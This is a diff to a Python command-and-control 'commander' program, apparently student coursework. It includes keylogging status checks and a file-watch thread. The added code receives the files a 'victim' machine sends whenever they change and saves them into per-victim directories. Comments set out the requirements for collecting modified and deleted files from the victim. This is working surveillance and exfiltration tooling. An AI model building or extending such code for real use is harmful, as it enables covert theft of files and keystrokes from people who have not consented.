@@ -7,7 +7,7 @@ import socket
 import time
 import constants
 import ipaddress
-
+from typing import TextIO
 
 def display_menu():
     print(constants.MENU_CLOSING_BANNER)
@@ -29,19 +29,22 @@ def display_menu():
     print(constants.MENU_CLOSING_BANNER)
 
 
-def get_menu_selection():
-    while True:
-        try:
-            choice = int(input(constants.MENU_SELECTION_PROMPT_MSG))
-            while not (constants.MIN_MENU_ITEM_VALUE <= choice <= constants.MAX_MENU_ITEM_VALUE):
-                choice = int(input(constants.INVALID_MENU_SELECTION_PROMPT))
-            break
-        except ValueError as e:
-            print(constants.INVALID_INPUT_MENU_ERROR.format(e))
+def get_user_menu_option(input_stream: TextIO):
+    command = input_stream.readline().strip()
 
-    print(constants.MENU_ACTION_START_MSG.format(choice))
-    print(constants.MENU_CLOSING_BANNER)
-    return choice
+    try:
+        command = int(command)
+        while not (constants.MIN_MENU_ITEM_VALUE <= command <= constants.MAX_MENU_ITEM_VALUE):
+            print(constants.INVALID_MENU_SELECTION_PROMPT)
+            command = sys.stdin.readline().strip()
+        print(constants.MENU_ACTION_START_MSG.format(command))
+        return command
+    except ValueError as e:
+        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
+        print(constants.INVALID_MENU_SELECTION)
+    except TypeError as e:
+        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
+        print(constants.INVALID_MENU_SELECTION)
 
 
 def print_config(dest_ip: str, dest_port: int, server_address: tuple):
@@ -282,6 +285,19 @@ def __is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: s
     if status:
         print(error_msg.format(client_ip, client_port))
         print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return True
+    else:
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return False
+
+
+def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
+    if status:
+        print(error_msg.format(client_ip, client_port))
+        print(constants.WATCH_FILE_STATUS_TRUE_ERROR_SUGGEST)
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return True
@@ -699,8 +715,18 @@ def create_file_name(file_path: str):
 def watch_file_client_socket(client_socket: socket.socket,
                              signal_queue: queue.Queue,
                              file_path: str,
-                             sub_directory_path: str):
-    while signal_queue.empty():
+                             sub_directory_path: str,
+                             client_list: dict,
+                             client_ip: str,
+                             client_port: int,
+                             is_keylog: bool):
+
+    while True:
+        # Check if a stop signal is received; remove signal from queue and send signal to client
+        if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
+            client_socket.send(constants.STOP_KEYWORD.encode())
+            break
+
         # Get Event from Client
         event = client_socket.recv(20).decode()
 
@@ -708,7 +734,25 @@ def watch_file_client_socket(client_socket: socket.socket,
         if event == "IN_MODIFY":
             file_name = create_file_name(file_path)
             new_file_path = sub_directory_path + "/" + file_name
-            print(new_file_path)
+
+            # Receive Modified File
+            with open(new_file_path, "wb") as file:
+                eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if not file_data:
+                        break  # No more data received
+                    if file_data.endswith(eof_marker):
+                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                        break
+                    else:
+                        file.write(file_data)
+
+            if is_file_openable(new_file_path):
+                print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
+            else:
+                print(constants.FILE_TRANSFER_ERROR)
 
         # DELETED: Move File to Deleted Directory
         if event == "IN_DELETE" or event == "IN_DELETE_SELF":
@@ -716,14 +760,16 @@ def watch_file_client_socket(client_socket: socket.socket,
             new_file_path = sub_directory_path + file_name
             print(new_file_path)
 
-# REQUIREMENTS
-        # 1) The victim will send you files as they change.
-        #    If the file is added or modified, store it in the ip-based directory.
-
-        # 2) If a file is deleted on the victim (event), do not delete it on the commander.
-
-        # 3) Instead of deleting, move the deleted file to a “deleted” directory
-        #    (limitation: do not test with a directory named deleted)
-
+    # Set WATCH_FILE status to false (Before ending thread)
+    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
     print("[+] ENDING THREAD: WATCH_FILE_THREAD has terminated!")
+    print("[+] WATCH FILE SUCCESSFUL: You have stopped watching the file...")
 
+    # REQUIREMENTS
+    # 1) The victim will send you files as they change.
+    #    If the file is added or modified, store it in the ip-based directory.
+
+    # 2) If a file is deleted on the victim (event), do not delete it on the commander.
+
+    # 3) Instead of deleting, move the deleted file to a “deleted” directory
+    #    (limitation: do not test with a directory named deleted)
